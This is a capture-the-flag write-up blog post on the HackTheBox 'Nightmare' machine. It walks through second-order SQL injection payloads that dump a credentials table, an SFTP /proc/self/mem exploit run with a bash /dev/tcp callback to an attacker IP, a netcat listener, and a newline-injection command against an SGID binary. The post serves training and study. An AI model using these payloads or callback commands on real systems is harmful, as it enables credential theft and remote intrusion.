---
title: "Nightmare"
date: 2027-02-25 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, insane, sql-injection, second-order-sqli, sftp, openssh, proc-self-mem, rce, sgid, command-injection]
image:
    path: /assets/Images/Nightmare-avatar.png
    alt: Nightmare
description: "Nightmare hides its credentials behind a second-order SQL injection — a username stored at registration is later re-used unescaped in a second query, so registering as a UNION SELECT dumps the users table in plaintext. Those creds only open a restricted, shell-less SFTP on a non-standard port, where an old-OpenSSH /proc/self/mem misconfiguration lets us overwrite the server's own stack for remote code execution without ever writing to disk. A SGID helper binary with a newline-injection flaw then reads the user flag."
---

## Overview

Nightmare is an insane-difficulty Linux box that leans on three distinct primitives just to reach the user flag. A notes application is vulnerable to *second-order* SQL injection, which leaks a full table of plaintext credentials. Those credentials only grant a locked-down, no-shell SFTP session on port 2222, so we abuse a classic old-OpenSSH `/proc/self/mem` misconfiguration to turn SFTP file access into code execution. Finally, a custom SGID binary with a sloppy argument filter lets us run a command as the `decoder` group and read `user.txt`. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,84.0 212.8,129.6 162.9,167.8 98.3,221.2 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Custom-heavy chain of second-order SQLi, the SECFORCE old-OpenSSH /proc/self/mem ROP exploit, and an SGID newline-injection bug; a documented download.php rabbit hole adds CTF flavor.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80   | HTTP (Apache) | notes web application |
| 2222 | SSH (OpenSSH, very old) | custom banner `SSH-2.0-OpenSSH 32bit (not so recent ver)`; SFTP-only accounts |

```bash
nmap -sC -sV 10.129.7.201
```

Two things stand out immediately: a web app on 80, and SSH parked on the non-standard 2222 advertising a deliberately ancient, 32-bit build. The banner is a strong hint that the SFTP `/proc/self/mem` class of bugs is in play.

## Enumeration

The web app exposes a register/login/notes flow. Directory brute-forcing also reveals `/secret/download.php` with a `filename` parameter, but that path turns out to be a rabbit hole — the real bug is in the notes feature.

The notes page is vulnerable to **second-order SQL injection**: the username you pick at registration is stored, then later re-used *unescaped* inside a `SELECT` when the notes page renders. The value is harmless on the way in and only fires when it is read back.

Register with a username that is actually a SQL fragment, then log in and view your notes:

```sql
-- username at registration (enumerate tables):
a') UNION SELECT TABLE_NAME,2 FROM information_schema.tables-- -

-- username at registration (dump credentials):
a') UNION SELECT username,password FROM sysadmin.users-- -
```

Loading the notes page renders the query results as if they were your notes — dumping the entire `sysadmin.users` table in plaintext, including an `ftpuser` account.

## Foothold

The recovered credentials do not give an interactive SSH session — `ftpuser` is restricted to SFTP with no TTY. They do authenticate, though (the modern OpenSSH client may reject the server's old algorithms, so verifying with a `paramiko` one-liner is handy):

```bash
python3 -c "import paramiko;c=paramiko.SSHClient();c.set_missing_host_key_policy(paramiko.AutoAddPolicy());c.connect('10.129.7.201',2222,'ftpuser','<redacted>',look_for_keys=False,allow_agent=False);print('AUTH OK');c.close()"
```

Because the SSH build is ancient, its SFTP subsystem lets the client open and write arbitrary paths — including the SFTP-server process's own `/proc/self/mem`. The SECFORCE *sftp-exploit* (Jann Horn's technique) reads `/proc/self/maps` and the libc over SFTP to locate the stack and `system()`, then writes a return-to-libc chain over the server's stack so the next function return slides into `system(<cmd>)`. No file ever needs to be written to disk.

Outbound traffic from the box is firewalled to port 443 only, so the command's output has to be sent back on 443. Run the exploit with a command that calls home over 443:

```bash
# attacker: catch the callback (443 needs root; or redirect 443->9443 and bind 9443)
nc -lvnp 9443

# trigger RCE as ftpuser, output exfiltrated to our listener on 443
python3 sftp_exploit3.py 10.129.7.201 2222 ftpuser '<redacted>' \
  'bash -c "id > /dev/tcp/10.10.16.13/443 2>&1"'
```

The callback returns `uid=1002(ftpuser)` — we have code execution.

## User flag

`ftpuser` has no write access anywhere on disk, but the box ships a custom SGID binary, `/usr/bin/sls` (SGID group `decoder`), that builds a shell command from its argument. Its `-b` flag disables newline filtering, so a newline injects a second command that runs with the `decoder` group — and `user.txt` is `decoder`-group readable:

```bash
sls -b "$(printf '\nid')"                            # egid=1001(decoder)
cat /home/decoder/user.txt                           # via sls injection -> HTB{...}
```

```bash
cat /home/decoder/user.txt   # HTB{...}
```

Access as the `decoder` group achieved and the user flag captured.

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Nightmare-avatar.png" alt="Nightmare" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
